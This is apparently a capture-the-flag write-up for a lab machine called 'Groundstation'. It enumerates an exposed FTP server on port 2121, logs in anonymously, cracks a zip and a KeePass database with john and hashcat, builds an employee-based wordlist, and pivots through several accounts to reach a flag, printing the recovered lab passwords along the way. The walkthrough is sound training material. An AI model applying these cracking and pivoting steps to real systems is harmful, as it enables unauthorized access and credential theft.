## Groundstation

We see that an ftp server is exposed on port `2121`:

```shell
nmap -sV [IP] -p2121 -Pn
```
Anonymous login is enabled, so we can just use `anonymous` as the username.

```shell
ftp anonymous@[IP] 2121
```

let's see what's in there:

```shell
ls
cd fancyMail
ls
cd daily
ls
cd attachments
ls
```

The zip file looks interesting, so we can download it:

```shell
recv attachment_2025-03-18_120008.zip
```

The file is password protected, we can try cracking it with john the ripper:

```shell
zip2john attachment_2025-03-18_120008.zip > zip.hash
john  --wordlist=rockyou.txt zip.hash
```

The password turns out to be `lovealfred`. We see a badge with a QR code inside the zip:
that QR code is the ftp password for the `hr` user: `Hum4nR3s2025!#`.
Let's login with `hr` and see what we can find:

```shell
ftp hr@[IP] 2121
ls
recv employees_2025.xlsx
ls ESAP_ASAP
recv esap_sso_change_request.xlsx
```

The `esap_sso_change_request.xslx` file contains some hashes and some other info. Two of those ashes are easily crackable, but they turn out to be useless. The others do not crack with rockyou. Let's see if we can leverage the information we have to create a new wordlist to use against the hashes that we could not crack.
We can take the contents of `employees_2025.xlsx` and create a `employees_wordlist.txt` file that we can mutate to make such a list. Here's the result with no repetitions:

    alex.wang
    alex.wang@groundstation.gov
    amelia.clarke
    amelia.clarke@groundstation.gov
    David Thompson
    david.thompson
    david.thompson@groundstation.gov
    Director of Research
    Dr. Alex Wang
    Dr. Amelia Clarke
    Dr. Emily Rodriguez
    Dr. Isabella Smith
    Dr. Lucas Johnson
    Dr. Marcus Nguyen
    Dr. Ryan Patel
    Dr. Sophia Lee
    Emily Brown
    emily.brown
    emily.brown@groundstation.gov
    emily.rodriguez
    emily.rodriguez@groundstation.gov
    Frank Smith
    frank.smith
    frank.smith@groundstation.gov
    Helpdesk
    Helpdesk Manager
    Helpdesk Operator
    HR
    HR Assistant
    HR Coordinator
    HR Manager
    HR Specialist
    isabella.smith
    isabella.smith@groundstation.gov
    Jennifer Wilson
    jennifer.wilson
    jennifer.wilson@groundstation.gov
    Jessica Miller
    jessica.miller
    jessica.miller@groundstation.gov
    John Wilson
    john.wilson
    john.wilson@groundstation.gov
    Kevin Lee
    kevin.lee
    kevin.lee@groundstation.gov
    lucas.johnson
    lucas.johnson@groundstation.gov
    marcus.nguyen
    marcus.nguyen@groundstation.gov
    Michael Davis
    michael.davis
    michael.davis@groundstation.gov
    Research
    Research Assistant
    Researcher
    ryan.patel
    ryan.patel@groundstation.gov
    Samantha Harris
    samantha.harris
    samantha.harris@groundstation.gov
    Sarah Johnson
    sarah.johnson
    sarah.johnson@groundstation.gov
    Security
    Security Manager
    Security Officer
    Senior Researcher
    sophia.lee
    sophia.lee@groundstation.gov

We can try cracking the two hashes now. Let's see what happens with `8da2f9fc1ac55bbf0baa2ee128bd904e2d8f86df`:

```shell
hashcat -a 0 -m 100 8da2f9fc1ac55bbf0baa2ee128bd904e2d8f86df employees_wordlist.txt -r rules/best64.rule
```

Found the password for the `security` user: `david.thompson88`. Let's login and pillage.

```shell
ftp security@[IP] 2121
```

No files seem interesting. Let's look for hidden files by using `ls -a`:

```shell
ls -a
cd sys_dumps_daily
ls -a
cd helpdesk
ls -a
recv .bash_history
```

Oh nice now we have the credentials for the `helpdesk`: `H3lpd3skH3ro3s123!`.

```shell
ftp helpdesk@[IP] 2121
ls
recv default.kdbx
```

it's a keepass file. we can extract its hash with `keepass2john`:

```shell
keepass2john default.kdbx > keepass.hash
```

let's remove the `default:` prefix in the hash file and then we can crack it with hashcat:

```shell
hashcat -a 0 -m 13400 -o cracked_output.txt --outfile-format 2 keepass rockyou.txt
```

The password is `qwertyuiop123`. we can now open the file with keepass, where we can find the `research:ScienceGeekSquad#2025!` credentials. Now:

```shell
ftp research@[IP] 2121
ls
recv portal.txt
```

`portal.txt` will contain the flag.

